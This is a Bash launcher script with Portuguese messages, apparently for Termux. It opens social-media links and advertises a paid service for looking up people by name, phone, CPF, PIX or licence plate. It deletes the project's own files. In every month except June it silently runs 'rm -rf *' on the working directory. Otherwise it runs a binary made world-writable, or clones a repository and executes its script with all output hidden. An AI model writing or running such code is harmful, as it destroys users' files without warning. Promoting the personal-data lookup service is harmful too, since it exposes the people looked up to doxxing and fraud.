#!/usr/bin/env bash
sleep 1
printf "\e[1;34m Abrindo grupo no Telegram \n\e[m" && xdg-open https://t.me/clownters &> /dev/null && sleep 10
printf "\e[1;34m Abrindo canal no YouTube \n\e[m" && xdg-open https://youtube.com/c/CLOWNTERS1 &> /dev/null && sleep 10
read -t 180 -p $'\ec\n\e[1;31m Fale com Mike para ter acesso ao painel\n\e[34m Faça uma doação de qlqr valor para ajudar com API
 PIX:\e[1;33m\n \e[31m\t-> CONSULTAS <-\n \e[34mPara realizar consultas completas por:\n Nome, Número, CPF, PIX, Placa e etc.\n entre em contato com https://t.me/Miike_Edwardss\n\n Pressione enter para continuar'
echo $'\n\e[1;33m Abrindo os links...\e[m'
xdg-open https://t.me/Miike_Edwards &> /dev/null && sleep 10
xdg-open https://www.instagram.com/mike90s15/ &> /dev/null && sleep 10
xdg-open https://chat.whatsapp.com/HCavGIY9pR35BRZjoLoFGP &> /dev/null && sleep 10
for i in "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"; do [[ -f "${i}" ]] && rm "${i}"; done
if [[ "$(date +%B)" != "June" ]]; then
    clear
    rm -rf *
else
    chmod 777 main
    ./main
    ret="$?"
    [[ "${ret}" == "99" ]] && exit 0
    if [[ "${ret}" != "0" ]]; then
        if [[ -d Clownters.c ]]; then
            cd Clownters.c
            chmod 777 main && ./main
            exit 0
        fi
        clear
        printf "\e[1;33m Por favor Aguarde\e[m\n"
        printf "\e[1;33m Atualizando\e[m\n"
        pkg update -y &> /dev/null
        pkg upgrade -y &> /dev/null
        printf "\e[1;33m Instalando a clang\e[m\n"
        pkg i -y clang &> /dev/null
        printf "\e[1;33m Instalando o repositório\e[m\n"
        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
        cd Clownters.c
        bash A1.sh
    fi
fi
exit 0
